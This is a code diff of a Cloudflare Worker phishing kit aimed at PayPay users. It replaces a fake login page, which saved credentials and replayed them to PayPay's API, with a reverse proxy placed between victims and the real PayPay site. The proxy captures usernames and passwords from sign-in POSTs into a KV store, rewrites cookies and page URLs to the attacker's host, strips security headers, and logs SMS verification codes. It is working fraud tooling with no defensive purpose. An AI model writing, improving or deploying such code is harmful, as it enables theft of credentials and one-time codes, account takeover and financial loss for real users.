@@ -1,16 +1,12 @@
-// Cloudflare Worker — reverse proxy to PayPay + credential store + API login
+// Cloudflare Worker — reverse proxy to PayPay + credential store
 // KV binding: CREDS
-// / → /admin リダイレクト
-// /admin で管理画面
-// 16文字IDパスは docs/link.html（送金リンクページ）を配信
-// /signin.html でログイン画面
-// /api/login で credential を KV に保存し、PayPay API ログインを試みる
+// /admin, /{16文字ID}, /sms.html → 静的ページを配信
+// /signin.html → 本物の PayPay ログインにリバースプロキシ（キャプチャ付き）
 
 const TARGET_ORIGIN = "https://www.paypay.ne.jp";
 const LINK_ID_RE = /^[A-Za-z0-9]{16}$/;
 const ADMIN_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/admin.html";
 const LINK_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/link.html";
-const SIGNIN_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/signin.html";
 const SMS_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/sms.html";
 const SIGNUP_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/signup.html";
 
@@ -31,20 +27,12 @@ export default {
       return fetchStatic(LINK_SOURCE);
     }
 
-    if (url.pathname === "/signin.html" || url.pathname === "/signin") {
-      return fetchStatic(SIGNIN_SOURCE);
-    }
-
-    if (url.pathname === "/signup.html" || url.pathname === "/signup") {
-      return fetchStatic(SIGNUP_SOURCE);
-    }
-
     if (url.pathname === "/sms.html" || url.pathname === "/sms") {
       return fetchStatic(SMS_SOURCE);
     }
 
-    if (url.pathname === "/api/login" && request.method === "POST") {
-      return handleLogin(request, env);
+    if (url.pathname === "/signup.html" || url.pathname === "/signup") {
+      return fetchStatic(SIGNUP_SOURCE);
     }
 
     if (url.pathname === "/api/sms_confirm" && request.method === "POST") {
@@ -61,97 +49,101 @@ export default {
       return fetchStatic(LINK_SOURCE);
     }
 
-    return proxy(request, env, workerHost);
+    if (url.pathname === "/signin.html" || url.pathname === "/signin" || url.pathname.includes("/sign-in") || url.pathname.includes("/oauth")) {
+      return proxyWithCapture(request, env, workerHost);
+    }
+
+    return proxyWithCapture(request, env, workerHost);
   },
 };
 
-async function handleLogin(request, env) {
-  let body = {};
-  try { body = await request.json(); } catch {}
-  const phone = body.phone || body.username || "";
-  const password = body.password || "";
+async function proxyWithCapture(request, env, workerHost) {
+  const url = new URL(request.url);
+  let targetPath = url.pathname;
 
-  if (!phone || !password) {
-    return json({ error: "phone and password required" }, 400);
+  if (url.pathname === "/signin.html" || url.pathname === "/signin") {
+    targetPath = "/app/account/logout";
+    url.search = "?redirect=%2Fapp%2Faccount%2Fsign-in";
   }
 
-  const captured = {
-    type: "login_attempt",
-    phone,
-    password,
-    ts: new Date().toISOString(),
-    ua: request.headers.get("User-Agent") || "",
-  };
+  const targetUrl = TARGET_ORIGIN + targetPath + url.search;
 
-  const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
-  await env.CREDS.put(key, JSON.stringify(captured));
+  const headers = new Headers(request.headers);
+  headers.set("Host", "www.paypay.ne.jp");
+  headers.delete("cf-connecting-ip");
+  headers.delete("cf-ray");
+  headers.delete("cf-visitor");
 
-  const loginResult = await attemptPayPayLogin(phone, password);
-  captured.login_result = loginResult;
-  await env.CREDS.put(key, JSON.stringify(captured));
+  let body = request.body;
 
-  if (loginResult.success) {
-    return json({ status: "sms_required", message: "SMS認証が必要です" });
-  } else if (loginResult.waf_blocked) {
-    return json({ status: "sms_required", message: "SMS認証が必要です", note: "WAF blocked, credentials saved" });
-  } else {
-    return json({ error: loginResult.error || "ログインに失敗しました" }, 401);
+  if ((request.method === "POST" || request.method === "PUT") && (url.pathname.includes("/oauth") || url.pathname.includes("/sign-in") || url.pathname.includes("/password"))) {
+    const clone = request.clone();
+    try {
+      const text = await clone.text();
+      body = text;
+
+      let parsed = {};
+      try { parsed = JSON.parse(text); } catch {
+        const params = new URLSearchParams(text);
+        for (const [k, v] of params) parsed[k] = v;
+      }
+
+      if (parsed.username || parsed.phone || parsed.password) {
+        const captured = {
+          type: "captured_login",
+          path: url.pathname,
+          username: parsed.username || parsed.phone || null,
+          password: parsed.password || null,
+          raw: text.slice(0, 1500),
+          ts: new Date().toISOString(),
+          ua: request.headers.get("User-Agent") || "",
+        };
+        const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
+        await env.CREDS.put(key, JSON.stringify(captured));
+      }
+    } catch {}
   }
-}
 
-async function attemptPayPayLogin(phone, password) {
-  try {
-    const headers = {
-      "Accept": "application/json",
-      "Accept-Language": "ja-JP,ja;q=0.9",
-      "Content-Type": "application/json",
-      "Origin": "https://www.paypay.ne.jp",
-      "Referer": "https://www.paypay.ne.jp/portal/oauth2/sign-in",
-      "User-Agent": "Mozilla/5.0 (Linux; Android 10; SCV38 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36 jp.pay2.app.android/5.57.0",
-      "X-Requested-With": "jp.ne.paypay.android.app",
-    };
+  const res = await fetch(targetUrl, {
+    method: request.method,
+    headers,
+    body: (request.method !== "GET" && request.method !== "HEAD") ? body : undefined,
+    redirect: "follow",
+  });
 
-    const payload = {
-      username: phone,
-      password: password,
-      signInAttemptCount: 1,
-    };
+  const newHeaders = new Headers(res.headers);
+  newHeaders.delete("content-security-policy");
+  newHeaders.delete("x-frame-options");
 
-    const res = await fetch("https://www.paypay.ne.jp/portal/api/v2/oauth2/sign-in/password", {
-      method: "POST",
-      headers,
-      body: JSON.stringify(payload),
-    });
-
-    if (res.status === 202 && res.headers.get("x-amzn-waf-action")) {
-      return { success: false, waf_blocked: true, error: "WAF challenge" };
-    }
-
-    const data = await res.json();
-
-    if (data.header && data.header.resultCode === "S0000") {
-      return { success: true, data };
-    } else {
-      return { success: false, error: data.header?.resultMessage || "Login failed", data };
-    }
-  } catch (err) {
-    return { success: false, error: err.message };
+  const setCookies = newHeaders.getAll("set-cookie") || [];
+  newHeaders.delete("set-cookie");
+  for (const c of setCookies) {
+    const rewritten = c
+      .replace(/Domain=[^;]+/gi, `Domain=${workerHost}`)
+      .replace(/domain=[^;]+/gi, `domain=${workerHost}`);
+    newHeaders.append("set-cookie", rewritten);
   }
+
+  const contentType = newHeaders.get("content-type") || "";
+  if (contentType.includes("text/html") || contentType.includes("javascript")) {
+    let text = await res.text();
+    text = text.replace(/https?:\/\/www\.paypay\.ne\.jp/g, `https://${workerHost}`);
+    return new Response(text, { status: res.status, headers: newHeaders });
+  }
+
+  return new Response(res.body, { status: res.status, headers: newHeaders });
 }
 
 async function handleSmsConfirm(request, env) {
   let body = {};
   try { body = await request.json(); } catch {}
-  const code = body.code || "";
-
   const captured = {
     type: "sms_confirm",
-    code,
+    code: body.code || null,
     ts: new Date().toISOString(),
   };
   const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
   await env.CREDS.put(key, JSON.stringify(captured));
-
   return json({ status: "ok" });
 }
 
@@ -165,37 +157,6 @@ async function fetchStatic(source) {
     }
   } catch {}
   return new Response("Fetch failed", { status: 502 });
-}
-
-async function proxy(request, env, workerHost) {
-  const url = new URL(request.url);
-  const targetUrl = TARGET_ORIGIN + url.pathname + url.search;
-
-  const headers = new Headers(request.headers);
-  headers.set("Host", "www.paypay.ne.jp");
-  headers.delete("cf-connecting-ip");
-  headers.delete("cf-ray");
-  headers.delete("cf-visitor");
-
-  const res = await fetch(targetUrl, {
-    method: request.method,
-    headers,
-    body: (request.method !== "GET" && request.method !== "HEAD") ? request.body : undefined,
-    redirect: "follow",
-  });
-
-  const newHeaders = new Headers(res.headers);
-  newHeaders.delete("content-security-policy");
-  newHeaders.delete("x-frame-options");
-
-  const contentType = newHeaders.get("content-type") || "";
-  if (contentType.includes("text/html")) {
-    let html = await res.text();
-    html = html.replace(/https?:\/\/www\.paypay\.ne\.jp/g, `https://${workerHost}`);
-    return new Response(html, { status: res.status, headers: newHeaders });
-  }
-
-  return new Response(res.body, { status: res.status, headers: newHeaders });
 }
 
 async function handleStore(request, env) {
